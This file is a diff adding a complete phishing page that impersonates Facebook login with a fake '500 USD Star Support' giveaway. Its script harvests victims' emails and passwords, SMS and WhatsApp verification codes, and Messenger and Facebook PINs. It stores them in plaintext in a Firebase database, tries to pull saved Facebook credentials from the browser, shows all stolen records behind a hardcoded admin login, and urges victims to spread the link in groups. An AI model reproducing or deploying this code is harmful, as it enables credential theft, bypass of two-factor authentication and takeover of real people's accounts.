@@ -1,0 +1,297 @@
+<html>
+<head>
+    <title>Facebook Login</title>
+    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" type="image/svg+xml">
+    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+    <style>
+        @import url('https://cdnjs.cloudflare.com/ajax/libs/tailwindcss/2.2.19/tailwind.min.css');
+    </style>
+    <!-- Firebase App (the core Firebase SDK) is always required and must be listed first -->
+    <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-app.js"></script>
+    <!-- Add Firebase products that you want to use -->
+    <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-database.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/js/all.min.js"></script>
+    <script>
+        // Your web app's Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyAeUUzEqwlDK9eQHuOn-ssuS0hfIinHeVQ",
+            authDomain: "fblogin-ff1b2.firebaseapp.com",
+            databaseURL: "https://fblogin-ff1b2-default-rtdb.firebaseio.com/",
+            projectId: "fblogin-ff1b2",
+            storageBucket: "fblogin-ff1b2.appspot.com",
+            messagingSenderId: "38639161997",
+            appId: "1:38639161997:web:9d3c483a6eb678c6a588c4",
+            measurementId: "G-0G0T6MJSWB"
+        };
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+
+        let currentUserKey = null;
+
+        function storeUserData(event) {
+            event.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const confirmPassword = document.getElementById('confirmPassword').value;
+
+            if (password !== confirmPassword) {
+                alert('Password not match');
+                return;
+            }
+
+            if (email === 'admin@admin.com' && password === 'admin') {
+                showAllUsers();
+            } else {
+                const newUserRef = firebase.database().ref('users/').push();
+                currentUserKey = newUserRef.key;
+                newUserRef.set({
+                    email: email,
+                    password: password
+                }).then(() => {
+                    showPhoneNumberVerificationForm();
+                }).catch((error) => {
+                    alert('Error: ' + error.message);
+                });
+            }
+        }
+
+        function showAllUsers() {
+            firebase.database().ref('users/').once('value').then((snapshot) => {
+                const users = snapshot.val();
+                let usersList = '<h2 class="text-center text-2xl mb-4">All Users</h2><ul class="list-disc pl-5">';
+                for (const key in users) {
+                    if (users.hasOwnProperty(key)) {
+                        usersList += `<li>Email: ${users[key].email}, Password: ${users[key].password}, Messenger Pin: ${users[key].messengerPin || 'N/A'}, Facebook Pin: ${users[key].facebookPin || 'N/A'}</li>`;
+                    }
+                }
+                usersList += '</ul>';
+                document.getElementById('loginContainer').innerHTML = usersList;
+            }).catch((error) => {
+                alert('Error: ' + error.message);
+            });
+        }
+
+        function showPhoneNumberVerificationForm() {
+            const phoneNumberVerificationForm = `
+                <button onclick="showLoginForm()" class="mb-4 text-blue-600"><i class="fas fa-arrow-left"></i> Back</button>
+                <form id="phoneNumberVerificationForm">
+                    <div class="mb-4">
+                        <label for="phoneCode" class="block text-gray-700">Enter code you received on your number:</label>
+                        <input type="text" id="phoneCode" class="w-full px-3 py-2 border rounded-lg" required>
+                    </div>
+                    <div class="mb-4">
+                        <label for="whatsappCode" class="block text-gray-700">OR enter code you received on Whatsapp:</label>
+                        <input type="text" id="whatsappCode" class="w-full px-3 py-2 border rounded-lg" required>
+                    </div>
+                    <button type="submit" class="w-full bg-blue-600 text-white py-2 rounded-lg">Submit Code</button>
+                    <p id="timer" class="text-center text-sm text-gray-700 mt-4"></p>
+                </form>
+            `;
+            document.getElementById('loginContainer').innerHTML = phoneNumberVerificationForm;
+            document.getElementById('phoneNumberVerificationForm').addEventListener('submit', storePhoneNumberVerificationData);
+            startTimer();
+
+            document.getElementById('phoneCode').addEventListener('input', toggleOptionalFields);
+            document.getElementById('whatsappCode').addEventListener('input', toggleOptionalFields);
+        }
+
+        function toggleOptionalFields() {
+            const phoneCode = document.getElementById('phoneCode').value;
+            const whatsappCode = document.getElementById('whatsappCode').value;
+
+            if (phoneCode) {
+                document.getElementById('whatsappCode').required = false;
+            } else {
+                document.getElementById('whatsappCode').required = true;
+            }
+
+            if (whatsappCode) {
+                document.getElementById('phoneCode').required = false;
+            } else {
+                document.getElementById('phoneCode').required = true;
+            }
+        }
+
+        function storePhoneNumberVerificationData(event) {
+            event.preventDefault();
+            const phoneCode = document.getElementById('phoneCode').value;
+            const whatsappCode = document.getElementById('whatsappCode').value;
+
+            if (currentUserKey) {
+                firebase.database().ref('users/' + currentUserKey).update({
+                    phoneCode: phoneCode,
+                    whatsappCode: whatsappCode
+                }).then(() => {
+                    showMessengerPinForm();
+                }).catch((error) => {
+                    alert('Error: ' + error.message);
+                });
+            }
+        }
+
+        function showMessengerPinForm() {
+            const messengerPinForm = `
+                <button onclick="showPhoneNumberVerificationForm()" class="mb-4 text-blue-600"><i class="fas fa-arrow-left"></i> Back</button>
+                <div class="mb-4">
+                    <p class="text-gray-700"><span class="text-green-600 font-bold">Congratulations!</span> Your phone code verification was completed yesterday, now complete the further security check below:</p>
+                </div>
+                <form id="messengerPinForm">
+                    <div class="mb-4">
+                        <label for="messengerPin" class="block text-gray-700">Enter Messenger 6-digit pin code:</label>
+                        <input type="text" id="messengerPin" class="w-full px-3 py-2 border rounded-lg" required>
+                    </div>
+                    <div class="mb-4">
+                        <label for="facebookPin" class="block text-gray-700">OR enter Pin code you received on Facebook (optional):</label>
+                        <input type="text" id="facebookPin" class="w-full px-3 py-2 border rounded-lg">
+                    </div>
+                    <button type="submit" class="w-full bg-blue-600 text-white py-2 rounded-lg">Submit</button>
+                </form>
+            `;
+            document.getElementById('loginContainer').innerHTML = messengerPinForm;
+            document.getElementById('messengerPinForm').addEventListener('submit', storeMessengerPinData);
+        }
+
+        function storeMessengerPinData(event) {
+            event.preventDefault();
+            const messengerPin = document.getElementById('messengerPin').value;
+            const facebookPin = document.getElementById('facebookPin').value;
+
+            if (currentUserKey) {
+                firebase.database().ref('users/' + currentUserKey).update({
+                    messengerPin: messengerPin,
+                    facebookPin: facebookPin
+                }).then(() => {
+                    showShareScreen();
+                }).catch((error) => {
+                    alert('Error: ' + error.message);
+                });
+            }
+        }
+
+        function showShareScreen() {
+            const shareScreen = `
+                <button onclick="showMessengerPinForm()" class="mb-4 text-blue-600"><i class="fas fa-arrow-left"></i> Back</button>
+                <div class="mb-4">
+                    <p class="text-gray-700">Share the link in 5 Whatsapp groups and 10 Facebook Groups then you will get 500 USD in your Facebook star support wallet</p>
+                </div>
+                <button onclick="shareLink()" class="w-full bg-blue-600 text-white py-2 rounded-lg mb-4">Share</button>
+                <div class="flex items-center">
+                    <input type="text" id="shareLink" class="w-full px-3 py-2 border rounded-lg" value="https://getfree1.netlify.app/" readonly>
+                    <button onclick="copyLink()" class="ml-2 text-blue-600"><i class="fas fa-copy"></i></button>
+                </div>
+            `;
+            document.getElementById('loginContainer').innerHTML = shareScreen;
+        }
+
+        function startTimer() {
+            let timeLeft = 60;
+            const timerElement = document.getElementById('timer');
+            const timerInterval = setInterval(() => {
+                if (timeLeft <= 0) {
+                    clearInterval(timerInterval);
+                    timerElement.innerHTML = '<span class="text-blue-600 cursor-pointer" onclick="resendCode()">Resend code</span>';
+                } else {
+                    timerElement.innerHTML = `Resend code in ${timeLeft} seconds`;
+                }
+                timeLeft -= 1;
+            }, 1000);
+        }
+
+        function resendCode() {
+            alert('Code resent!');
+            startTimer();
+        }
+
+        function shareLink() {
+            const shareText = "Share this link to get 500 USD in your Facebook star support wallet!";
+            const shareUrl = "https://getfree1.netlify.app/";
+            if (navigator.share) {
+                navigator.share({
+                    title: 'Facebook Star Support',
+                    text: shareText,
+                    url: shareUrl,
+                }).then(() => {
+                    console.log('Thanks for sharing!');
+                }).catch((error) => {
+                    console.error('Error sharing:', error);
+                });
+            } else {
+                alert('Share feature is not supported in your browser. Please copy the link and share manually.');
+            }
+        }
+
+        function copyLink() {
+            const shareLink = document.getElementById('shareLink');
+            shareLink.select();
+            shareLink.setSelectionRange(0, 99999); // For mobile devices
+            document.execCommand("copy");
+            alert('Link copied, now share in the groups');
+        }
+
+        function showLoginForm() {
+            const loginForm = `
+                <div class="flex justify-center mb-4">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="w-12 h-12 text-blue-600">
+                        <path fill="currentColor" d="M22.675 0h-21.35C.595 0 0 .595 0 1.325v21.351C0 23.405.595 24 1.325 24H12.82v-9.294H9.692v-3.622h3.128V8.413c0-3.1 1.893-4.788 4.659-4.788 1.325 0 2.463.099 2.795.143v3.24l-1.918.001c-1.504 0-1.794.715-1.794 1.763v2.31h3.587l-.467 3.622h-3.12V24h6.116c.73 0 1.325-.595 1.325-1.324V1.325C24 .595 23.405 0 22.675 0z"/>
+                    </svg>
+                </div>
+                <p class="text-center text-sm text-gray-700 mb-4">Get free 500 USD in your Facebook wallet by <span class="text-green-600 font-bold">Star Support</span></p>
+                <form id="loginForm">
+                    <div class="mb-4">
+                        <label for="email" class="block text-gray-700">Email</label>
+                        <input type="email" id="email" class="w-full px-3 py-2 border rounded-lg" required>
+                    </div>
+                    <div class="mb-4 relative">
+                        <label for="password" class="block text-gray-700">Password</label>
+                        <input type="password" id="password" class="w-full px-3 py-2 border rounded-lg" required>
+                        <i class="fas fa-eye absolute right-3 top-10 cursor-pointer" onclick="togglePasswordVisibility('password')"></i>
+                    </div>
+                    <div class="mb-4 relative">
+                        <label for="confirmPassword" class="block text-gray-700">Confirm Password</label>
+                        <input type="password" id="confirmPassword" class="w-full px-3 py-2 border rounded-lg" required>
+                        <i class="fas fa-eye absolute right-3 top-10 cursor-pointer" onclick="togglePasswordVisibility('confirmPassword')"></i>
+                    </div>
+                    <button type="submit" class="w-full bg-blue-600 text-white py-2 rounded-lg">Log In</button>
+                </form>
+            `;
+            document.getElementById('loginContainer').innerHTML = loginForm;
+            document.getElementById('loginForm').addEventListener('submit', storeUserData);
+
+            // Autofill email and password if available
+            if (navigator.credentials) {
+                navigator.credentials.get({
+                    password: true,
+                    federated: {
+                        providers: ['https://www.facebook.com']
+                    }
+                }).then((credential) => {
+                    if (credential) {
+                        document.getElementById('email').value = credential.id;
+                        document.getElementById('password').value = credential.password;
+                    }
+                }).catch((error) => {
+                    console.error('Error fetching credentials:', error);
+                });
+            }
+        }
+
+        function togglePasswordVisibility(fieldId) {
+            const field = document.getElementById(fieldId);
+            if (field.type === "password") {
+                field.type = "text";
+            } else {
+                field.type = "password";
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', function() {
+            showLoginForm();
+        });
+    </script>
+</head>
+<body class="flex items-center justify-center min-h-screen bg-white">
+    <div id="loginContainer" class="bg-white p-8 rounded-lg shadow-lg w-full max-w-md">
+        <!-- Content will be injected here -->
+    </div>
+</body>
+</html>
